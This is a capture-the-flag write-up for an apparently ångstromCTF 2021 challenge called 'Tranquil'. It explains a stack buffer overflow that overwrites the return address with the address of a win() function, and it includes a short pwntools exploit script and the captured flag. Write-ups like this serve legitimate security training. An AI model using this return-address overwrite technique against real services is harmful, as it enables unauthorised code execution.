# Tranquil

## Description

Finally, [inner peace](tranquil) - Master Oogway

[Source](tranquil.c)

Connect with `nc shell.actf.co 21830`, or find it on the shell server at `/problems/2021/tranquil`.

## Solution

First of all, Actf's platform gives even the source code and the binary file. 
Using gdb, we can discover win() function's address. (0x401196)

We just fill the offset starting from the buffer that the software fills necessary to reach the return address. Then, we swap the address with the function's one. 
That's it.
By executing the function, the software gives us the flag.

```python
from pwn import *
import sys
import struct
import os

context.arch = 'amd64'

host = "shell.actf.co"
port = 21830
conn = remote(host, port)

win = 0x401196

payload = b"A" * 72
payload += struct.pack("L", win)
conn.sendline(payload)
conn.interactive()
```


#### **FLAG >>** `actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}`
